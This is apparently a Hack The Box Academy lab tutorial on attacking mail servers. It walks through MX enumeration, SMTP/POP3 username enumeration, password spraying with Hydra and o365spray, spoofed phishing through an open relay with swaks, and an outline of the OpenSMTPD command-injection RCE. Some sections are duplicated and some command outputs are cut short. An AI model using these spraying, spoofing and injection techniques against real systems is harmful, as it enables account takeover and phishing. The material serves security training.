A protocol overview

## Enumeration
Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) or [G-Suite](https://workspace.google.com/solutions/new-business/). Therefore, our approach to attacking the email service depends on the service in use.

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

```shell-session
alakin2504@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```shell-session
alakin2504@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

```shell-session
alakin2504@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```shell-session
alakin2504@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

```shell-session
alakin2504@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

These `MX` records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.

If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:

```shell-session
alakin2504@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
```

## Misconfigurations
A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

#### Authentication

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

#### VRFY Command

```shell-session
alakin2504@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root

```

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

#### EXPN Command

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

#### EXPN Command

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

#### RCPT TO Command

```shell-session
alakin2504@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

#### USER Command

```shell-session
alakin2504@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.
```shell-session
alakin2504@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

## Cloud Enumeration

As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

#### O365 Spray
```shell-session
alakin2504@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.
```shell-session
alakin2504@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<
```

## Password Attacks

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

#### Hydra - Password Attack
```shell-session
alakin2504@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

#### O365 Spray - Password Spraying

```shell-session
alakin2504@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***

## Protocol Specifics Attacks

An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

#### Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```shell-session
alakin2504@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.


```shell-session
alakin2504@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

## The Concept of the Attack

As we already know, with the SMTP service, we can compose emails and send them to desired people. The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (`;`) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found [here](https://www.openwall.com/lists/oss-security/2020/01/28/3).

#### The Concept of Attacks

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

Here we need to initialize a connection with the SMTP service first. This can be automated by a script or entered manually. After the connection is established, an email must be composed in which we define the sender, the recipient, and the actual message for the recipient. The desired system command is inserted in the sender field connected to the sender address with a semicolon (`;`). As soon as we finish writing, the data entered is processed by the OpenSMTPD process.

#### Initiation of the Attack

|**Step**|**Remote Code Execution**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The source is the user input that can be entered manually or automated during direct interaction with the service.|`Source`|
|`2.`|The service will take the email with the required information.|`Process`|
|`3.`|Listening to the standardized ports of a system requires `root` privileges on the system, and if these ports are used, the service runs accordingly with elevated privileges.|`Privileges`|
|`4.`|As the destination, the entered information is forwarded to another local process.|`Destination`|

This is when the cycle starts all over again, but this time to gain remote access to the target system.

#### Trigger Remote Code Execution

|**Step**|**Remote Code Execution**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|This time, the source is the entire input, especially from the sender area, which contains our system command.|`Source`|
|`6.`|The process reads all the information, and the semicolon (`;`) interrupts the reading due to special rules in the source code that leads to the execution of the entered system command.|`Process`|
|`7.`|Since the service is already running with elevated privileges, other processes of OpenSMTPD will be executed with the same privileges. With these, the system command we entered will also be executed.|`Privileges`|
|`8.`|The destination for the system command can be, for example, the network back to our host through which we get access to the system.|`Destination`|

An [exploit](https://www.exploit-db.com/exploits/47984) has been published on the [Exploit-DB](https://www.exploit-db.com/) platform for this vulnerability which can be used for more detailed analysis and the functionality of the trigger for the execution of system commands.

## Next Steps

As we've seen, email attacks can lead to sensitive data disclosure through direct access to a user's inbox or by combining a misconfiguration with a convincing phishing email. There are other ways to attack email services that can be very effective as well. A few Hack The Box boxes demonstrate email attacks, such as [Rabbit](https://www.youtube.com/watch?v=5nnJq_IWJog), which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, [SneakyMailer](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html) which has elements of phishing and enumerating a user's inbox using Netcat and an IMAP client, and [Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html) which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.

It's worth playing these boxes, or at least watching the Ippsec video or reading a walkthrough to see examples of these attacks in action. This goes for any attack demonstrated in this module (or others). The site [ippsec.rocks](https://ippsec.rocks/?#) can be used to search for common terms and will show which HTB boxes these appear in, which will reveal a wealth of targets to practice against.
